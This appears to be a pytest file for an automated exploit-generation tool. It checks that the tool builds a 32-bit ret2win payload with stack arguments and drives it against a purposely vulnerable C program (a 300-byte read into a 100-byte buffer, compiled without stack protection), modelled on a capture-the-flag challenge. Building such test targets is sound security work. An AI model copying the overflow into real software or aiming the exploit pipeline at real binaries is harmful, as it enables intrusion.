"""32-bit (i386) L3: the ladder drives i386 through qemu-user's gdbstub, and ret2win takes STACK
arguments (the 32-bit cdecl case, e.g. HTB 0xDiablos' flag(0xdeadbeef, 0xc0ded00d))."""
import shutil
import struct
import subprocess

import pytest

from lykos.analyze.poc import exploit as ex


def test_ret2win_input_stack_args():
    """win_args places a fake return then the arguments after the win address (cdecl layout)."""
    p = ex.ret2win_input(112, 0x8049186, 0, word=4, win_args=[0xDEADBEEF, 0xC0DED00D],
                         ret_pad=0x8049186)
    q = lambda o: struct.unpack_from("<I", p, o)[0]      # noqa: E731
    assert q(112) == 0x8049186                            # win address at the control slot
    assert q(116) == 0x8049186                            # fake return (ret_pad)
    assert q(120) == 0xDEADBEEF and q(124) == 0xC0DED00D  # the two stack arguments


@pytest.fixture
def pool(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


@pytest.fixture
def diablos_bin(tmp_path_factory):
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64":
        pytest.skip("host must run i386 (multilib)")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("i386")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <unistd.h>\n'
        'void flag(unsigned a, unsigned b){ if(a==0xdeadbeef && b==0xc0ded00d) '
        'puts("HTB{i386_win}"); else puts("nope"); }\n'
        'void vuln(){ char b[100]; read(0,b,300); }\n'
        'int main(){ setvbuf(stdout,0,2,0); vuln(); return 0; }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-m32", "-no-pie", "-fno-stack-protector", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("no 32-bit toolchain")
    return exe


def test_i386_ret2win_with_args_reaches_l3(store, case, pool, diablos_bin):
    """End-to-end: a 32-bit no-PIE binary with a flag(a,b) win function is driven to a confirmed L3
    ret2win -- offset auto-recovered via the qemu i386 gdbstub, arguments placed on the stack."""
    from lykos.analyze.detect.stage import enqueue_detect
    from lykos.analyze.disassemble import enqueue_disassemble
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, diablos_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    enqueue_disassemble(q, t, force=True)
    assert pool.wait_idle(120)
    enqueue_detect(q, t, force=True)
    assert pool.wait_idle(60)
    run = enqueue_exploit(q, t, params={"strategy": "ret2win", "win_name": "flag",
                                        "win_args": ["0xdeadbeef", "0xc0ded00d"]})
    assert pool.wait_idle(120) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"no confirmed L3 i386 ret2win (pocs={[(p.level, p.verified) for p in pocs]})"
